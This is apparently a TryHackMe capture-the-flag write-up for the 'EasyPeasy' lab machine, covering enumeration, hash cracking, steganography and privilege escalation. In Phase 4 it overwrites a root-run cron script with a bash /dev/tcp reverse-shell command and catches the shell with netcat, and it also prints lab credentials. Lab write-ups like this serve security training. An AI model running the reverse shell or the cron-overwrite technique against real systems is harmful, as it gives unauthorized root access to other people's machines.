# TryHackMe - EasyPeasy

**Machine Name:** EasyPeasy  
**Difficulty:** Easy/Medium  
**Category:** Enumeration / Steganography / Privilege Escalation  
**IP Address:** 10.130.160.246  

---

## Executive Summary
The EasyPeasy machine is a deep dive into enumeration and multi-layered data obfuscation. Initial access required identifying three separate hidden flags across two different web servers (Nginx and Apache) using various encoding schemes (Base64, MD5, and Base62). Steganography was used to hide user credentials within an image file. Final privilege escalation was achieved by identifying a world-writable cron job script running as the root user.

---

## Phase 1: Enumeration

### Port Scanning
I initiated a full port scan to identify all open services:
`nmap -p- -sV -sC -Pn --min-rate 1000 10.130.160.246`

**Findings:**
* **Port 80 (HTTP):** Nginx 1.16.1.
* **Port 6498 (SSH):** OpenSSH 7.6p1 (Non-standard port).
* **Port 65524 (HTTP):** Apache httpd 2.4.43.

### Web Reconnaissance (Port 80)
I ran Gobuster to find hidden directories on the standard Nginx server:
`gobuster dir -u http://10.130.160.246 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,zip,bak,inc -t 50`

I discovered `/hidden/`, and a second scan on that directory revealed `/hidden/whatever/`.

**Flag #1 Discovery:**
Inspecting the page source code (`Ctrl+U`) of the discovered directories revealed a hidden comment containing a Base64 string: `ZmxhZ3tmMXJzN19mbDRnfQ==`.
`echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d`
**Result:** `flag{f1rs7_fl4g}`

---

## Phase 2: Vulnerability Discovery

### Web Enumeration (Port 65524)
I investigated the Apache server on the high port and checked the `robots.txt` file:
`http://10.130.160.246:65524/robots.txt`

**Flag #2 Discovery:**
The `robots.txt` file contained a User-Agent that appeared to be an MD5 hash: `a18672860d0510e5ab6699730763b250`.  I treid to decrypt the md5 hash using multiple websites until this one worked: https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250I.
**Result:** `flag{1m_s3c0nd_fl4g}`

### Hidden Directory & Steganography
Inspecting the source code of the main page on port 65524 revealed another hidden hint:
`<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>`

I then went to Cyberchef and tried multiple encodings started with `Ba` has stated on the clue, and finally **Base62** worked.
`ObsJmP173N2X6dOrAgEAL0Vu` decodes to: `/n0th1ng3ls3m4tt3r`

Navigating to that hidden directory showed an image (`binarycodepixabay.jpg`). The source code of this page contained a hash:
`940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81`

I used hashid to identify it has Gost hash, to crack it, I went to the same website used previously to crack the md5 but i used Gost hash this time, but i could have also cracked it using john and the provided word list by the challenge, like so:

`john — format=gost /home/morth/password.txt — wordlists=/home/morth/easypeasy.txt`
**Result:** `mypasswordforthatjob`

---

## Phase 3: Exploitation (Initial Access)

### Steganography Extraction
I downloaded the image and used `stegseek` to extract hidden data using the machine's specific wordlist (`easypeasy.txt`):
`stegseek binarycodepixabay.jpg easypeasy.txt`

This extracted a file named `secrettext.txt`. Using `cat` on the file revealed:
* **Username:** `boring`
* **Password (Binary):** `01101001 01100011 01101111 ...`
I decoded the binary string via CyberChef to get the password: `iconvertedmypasswordtobinary`

### SSH Access
I logged into the machine via the SSH port detected in the nmap:
`ssh boring@10.130.160.246 -p 6498`

Inside the home directory, the `user.txt` file was obfuscated with **ROT13**:
`cat user.txt` -> `synt{a0jvgf33zfa0ez4y}`
**Decoded Result:** `....{.......}`

---

## Phase 4: Privilege Escalation (boring -> root)

### Identifying the Vector
Then i checked basic permissions and cronjobs until I found something relevant:
`cat /etc/crontab`

I identified a recurring task running as **root** every minute:
`* * * * * root cd /var/www/ && sudo bash .mysecretcronjob.sh`

### Exploiting the Writable Cron Job
I checked the permissions of the script:
`ls -la /var/www/.mysecretcronjob.sh`
Output: `-rwxr-xr-x 1 boring boring ...`

Since the `boring` user owned the file, I replaced its contents with a reverse shell payload:
`echo "bash -i >& /dev/tcp/10.10.x.x/4444 0>&1" > /var/www/.mysecretcronjob.sh`

I set up a Netcat listener on Kali: `nc -lvnp 4444`. Within one minute, the cron job executed as root, granting me a root shell.

**Final Flag Discovery:**
`whoami` -> `root`
`find / -type f -name "*root*" 2>/dev/null`
`cat /root/.root.txt`

---

## Conclusion
The EasyPeasy machine reinforces the importance of deep enumeration and not taking encoding at face value. The challenge relied heavily on identifying the correct encoding (Base62 vs Base64) and utilizing steganography tools like `stegseek`. The privilege escalation was a textbook example of insecure file ownership on an automated root process.

---

## Appendix: Technical Details
* **Base62 Encoding:** A numbering scheme using `0-9`, `a-z`, and `A-Z`.
* **GOST R 34.11-94:** A Russian 256-bit cryptographic hash function.
* **Cron Job PrivEsc:** Exploiting the trust of an automated task by modifying the script it executes.
